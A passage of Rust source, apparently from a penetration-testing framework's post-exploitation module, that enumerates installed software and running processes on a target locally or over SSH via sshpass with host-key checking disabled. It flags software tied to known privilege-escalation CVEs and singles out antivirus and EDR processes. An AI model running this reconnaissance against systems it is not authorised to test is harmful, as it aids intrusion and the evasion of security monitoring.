                .output()
                .await
        }
    } else {
        let creds = match config.credentials.as_ref() {
            Some(c) => c,
            None => {
                return Ok(PostExploitResult {
                    module: PostExploitModule::InstalledSoftware,
                    target: config.target.clone(),
                    success: false,
                    findings: vec![],
                    error: Some("Credentials required for remote software enumeration".to_string()),
                    timestamp: Utc::now(),
                });
            }
        };

        let ssh_cmd = format!(
            "sshpass -p '{}' ssh -o StrictHostKeyChecking=no {}@{} \"{}\"",
            creds.password.as_deref().unwrap_or(""),
            creds.username,
            config.target,
            linux_cmd
        );

        tokio::time::timeout(
            Duration::from_secs(60),
            Command::new("sh")
                .args(["-c", &ssh_cmd])
                .output()
        ).await.unwrap_or_else(|_| Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "Timeout")))
    };

    // Software known to have vulnerabilities
    let vuln_software = vec![
        ("openssh", "SSH server - check for auth bypass CVEs"),
        ("openssl", "Crypto library - Heartbleed, ROBOT"),
        ("apache", "Web server - path traversal, RCE"),
        ("nginx", "Web server - various CVEs"),
        ("mysql", "Database - auth bypass, RCE"),
        ("mariadb", "Database - various CVEs"),
        ("postgresql", "Database - privilege escalation"),
        ("php", "PHP interpreter - various RCE"),
        ("python", "Python interpreter - pickle RCE"),
        ("node", "Node.js - prototype pollution"),
        ("java", "Java/JRE - deserialization"),
        ("docker", "Container runtime - escape vulnerabilities"),
        ("sudo", "Privilege escalation - Baron Samedit"),
        ("polkit", "Privilege escalation - PwnKit"),
        ("kernel", "Linux kernel - privilege escalation"),
    ];

    if let Ok(output) = output {
        let stdout = String::from_utf8_lossy(&output.stdout);

        // Parse WMIC output (Windows)
        if stdout.contains("Name") && stdout.contains("Version") {
            let mut skip_header = true;
            for line in stdout.lines() {
                if skip_header {
                    skip_header = false;
                    continue;
                }
                let line = line.trim();
                if line.is_empty() {
                    continue;
                }

                // WMIC output is space-padded columns
                let parts: Vec<&str> = line.splitn(2, "  ").collect();
                if parts.len() >= 1 {
                    let name = parts[0].trim();
                    let version = if parts.len() > 1 { parts[1].trim() } else { "" };

                    if !name.is_empty() && name != "Name" {
                        let mut details = HashMap::new();
                        details.insert("name".to_string(), serde_json::json!(name));
                        details.insert("version".to_string(), serde_json::json!(version));
                        details.insert("os".to_string(), serde_json::json!("windows"));

                        findings.push(make_finding_with_details(
                            "installed_software",
                            name,
                            details,
                            Severity::Info,
                        ));
                    }
                }
            }
        }

        // Parse dpkg -l output (Debian/Ubuntu)
        if stdout.contains("ii ") || stdout.contains("rc ") {
            for line in stdout.lines() {
                if line.starts_with("ii ") || line.starts_with("hi ") {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if parts.len() >= 3 {
                        let name = parts[1];
                        let version = parts[2];

                        // Check if this is known vulnerable software
                        let is_notable = vuln_software.iter()
                            .any(|(sw, _)| name.to_lowercase().contains(sw));

                        let mut details = HashMap::new();
                        details.insert("name".to_string(), serde_json::json!(name));
                        details.insert("version".to_string(), serde_json::json!(version));
                        details.insert("package_manager".to_string(), serde_json::json!("dpkg"));
                        details.insert("os".to_string(), serde_json::json!("linux"));

                        if is_notable {
                            if let Some((_, note)) = vuln_software.iter()
                                .find(|(sw, _)| name.to_lowercase().contains(sw)) {
                                details.insert("security_note".to_string(), serde_json::json!(note));
                            }
                        }

                        findings.push(make_finding_with_details(
                            "installed_software",
                            name,
                            details,
                            if is_notable { Severity::Medium } else { Severity::Info },
                        ));
                    }
                }
            }
        }

        // Parse rpm -qa output (RHEL/CentOS)
        if !stdout.contains("ii ") && stdout.contains('-') && !stdout.contains("+++-") {
            for line in stdout.lines() {
                let line = line.trim();
                if line.is_empty() {
                    continue;
                }

                // RPM format: name-version-release.arch
                if let Some(last_dash) = line.rfind('-') {
                    if let Some(second_dash) = line[..last_dash].rfind('-') {
                        let name = &line[..second_dash];
                        let version = &line[second_dash + 1..];

                        let is_notable = vuln_software.iter()
                            .any(|(sw, _)| name.to_lowercase().contains(sw));

                        let mut details = HashMap::new();
                        details.insert("name".to_string(), serde_json::json!(name));
                        details.insert("version".to_string(), serde_json::json!(version));
                        details.insert("package_manager".to_string(), serde_json::json!("rpm"));
                        details.insert("os".to_string(), serde_json::json!("linux"));

                        findings.push(make_finding_with_details(
                            "installed_software",
                            name,
                            details,
                            if is_notable { Severity::Medium } else { Severity::Info },
                        ));
                    }
                }
            }
        }
    }

    let success = !findings.is_empty();

    Ok(PostExploitResult {
        module: PostExploitModule::InstalledSoftware,
        target: config.target.clone(),
        success,
        findings,
        error: None,
        timestamp: Utc::now(),
    })
}

async fn enumerate_running_processes(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // Enumerate running processes to identify security software, services, etc.
    info!("Enumerating running processes on {}", config.target);

    let is_local = config.target == "localhost" ||
                   config.target == "127.0.0.1" ||
                   config.target == "::1";

    let mut findings = Vec::new();

    // Windows: tasklist, Linux: ps aux
    let win_cmd = "tasklist /v 2>nul";
    let linux_cmd = "ps aux 2>/dev/null";

    let output = if is_local {
        let win_output = Command::new("cmd")
            .args(["/c", win_cmd])
            .output()
            .await;

        if let Ok(ref output) = win_output {
            if output.status.success() && output.stdout.len() > 100 {
                win_output
            } else {
                Command::new("sh")
                    .args(["-c", linux_cmd])
                    .output()
                    .await
            }
        } else {
            Command::new("sh")
                .args(["-c", linux_cmd])
                .output()
                .await
        }
    } else {
        let creds = match config.credentials.as_ref() {
            Some(c) => c,
            None => {
                return Ok(PostExploitResult {
                    module: PostExploitModule::RunningProcesses,
                    target: config.target.clone(),
                    success: false,
                    findings: vec![],
                    error: Some("Credentials required for remote process enumeration".to_string()),
                    timestamp: Utc::now(),
                });
            }
        };

        let ssh_cmd = format!(
            "sshpass -p '{}' ssh -o StrictHostKeyChecking=no {}@{} \"{}\"",
            creds.password.as_deref().unwrap_or(""),
            creds.username,
            config.target,
            linux_cmd
        );

        tokio::time::timeout(
            Duration::from_secs(30),
            Command::new("sh")
                .args(["-c", &ssh_cmd])
                .output()
        ).await.unwrap_or_else(|_| Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "Timeout")))
    };

    // Interesting processes to highlight
    let security_software = vec![
        // Windows AV/EDR
        "defender", "msmpeng", "mpcmdrun", "crowdstrike", "falcon",
        "carbonblack", "cb.", "cylance", "sentinel", "sophos", "avg",
        "avast", "kaspersky", "norton", "mcafee", "eset", "symantec",
        "trend", "bitdefender", "malware", "antivirus",
        // Linux security
        "ossec", "aide", "tripwire", "clamd", "fail2ban", "auditd",
        "selinux", "apparmor",
    ];

    let admin_tools = vec![
        // Remote admin
        "sshd", "winrm", "rdpclip", "teamviewer", "anydesk", "vnc",
        "logmein", "bomgar", "dameware",
        // Monitoring
        "zabbix", "nagios", "datadog", "newrelic", "splunk", "syslog",
    ];

    let services_of_interest = vec![
        // Databases
        "mysql", "postgres", "mongo", "redis", "elastic", "mssql",
        // Web servers
        "httpd", "apache", "nginx", "iis", "tomcat",
        // Other
        "docker", "kube", "vault", "consul",
    ];

    if let Ok(output) = output {
        let stdout = String::from_utf8_lossy(&output.stdout);

        // Parse Windows tasklist output
        if stdout.contains("Image Name") || stdout.contains("PID") && stdout.contains("Session") {
            let mut skip_header = true;
            for line in stdout.lines() {
                if skip_header {
                    if line.contains("===") {
                        skip_header = false;
                    }
                    continue;
                }

                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() >= 2 {
                    let process_name = parts[0].to_lowercase();
                    let _pid = parts[1];

                    // Check if this is interesting
                    let is_security = security_software.iter()
                        .any(|sw| process_name.contains(sw));
                    let is_admin = admin_tools.iter()
                        .any(|tool| process_name.contains(tool));
                    let is_service = services_of_interest.iter()
                        .any(|svc| process_name.contains(svc));

                    if is_security || is_admin || is_service {
                        let mut details = HashMap::new();
                        details.insert("process_name".to_string(), serde_json::json!(parts[0]));
                        details.insert("pid".to_string(), serde_json::json!(parts[1]));
                        details.insert("os".to_string(), serde_json::json!("windows"));

                        let (category, severity) = if is_security {
                            details.insert("category".to_string(), serde_json::json!("security_software"));
                            ("security_software", Severity::High)
                        } else if is_admin {
                            details.insert("category".to_string(), serde_json::json!("admin_tool"));
                            ("admin_tool", Severity::Medium)
                        } else {
                            details.insert("category".to_string(), serde_json::json!("service"));
                            ("service", Severity::Info)
                        };

                        findings.push(make_finding_with_details(
                            category,
                            parts[0],
                            details,
                            severity,
                        ));
                    }
                }
            }
        }

        // Parse Linux ps aux output
        if stdout.contains("USER") && stdout.contains("PID") && stdout.contains("COMMAND") {
            let mut skip_header = true;
            for line in stdout.lines() {
                if skip_header {
                    skip_header = false;
                    continue;
                }

                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() >= 11 {
                    let user = parts[0];
                    let pid = parts[1];
                    let cpu = parts[2];
                    let mem = parts[3];
                    let command = parts[10..].join(" ");

                    let process_lower = command.to_lowercase();

                    let is_security = security_software.iter()
                        .any(|sw| process_lower.contains(sw));
                    let is_admin = admin_tools.iter()
                        .any(|tool| process_lower.contains(tool));
                    let is_service = services_of_interest.iter()
                        .any(|svc| process_lower.contains(svc));
                    let is_root = user == "root";

                    if is_security || is_admin || is_service || (is_root && cpu.parse::<f32>().unwrap_or(0.0) > 5.0) {
                        let mut details = HashMap::new();
                        details.insert("user".to_string(), serde_json::json!(user));
                        details.insert("pid".to_string(), serde_json::json!(pid));
                        details.insert("cpu".to_string(), serde_json::json!(cpu));
                        details.insert("mem".to_string(), serde_json::json!(mem));
                        details.insert("command".to_string(), serde_json::json!(command));
                        details.insert("os".to_string(), serde_json::json!("linux"));

                        let (category, severity) = if is_security {
                            details.insert("category".to_string(), serde_json::json!("security_software"));
                            ("security_software", Severity::High)
                        } else if is_admin {
                            details.insert("category".to_string(), serde_json::json!("admin_tool"));
                            ("admin_tool", Severity::Medium)
                        } else if is_service {
                            details.insert("category".to_string(), serde_json::json!("service"));
                            ("service", Severity::Info)
                        } else {
                            details.insert("category".to_string(), serde_json::json!("root_process"));
                            ("root_process", Severity::Info)
                        };

                        // Extract just the process name for the finding value
                        let process_name = command.split('/').last()
                            .unwrap_or(&command)
                            .split_whitespace().next()
                            .unwrap_or(&command);

                        findings.push(make_finding_with_details(
                            category,
                            process_name,
                            details,
                            severity,
                        ));
                    }
                }
            }
        }
    }

    let success = !findings.is_empty();

    Ok(PostExploitResult {
        module: PostExploitModule::RunningProcesses,
        target: config.target.clone(),
        success,
        findings,
        error: None,
        timestamp: Utc::now(),
    })
}
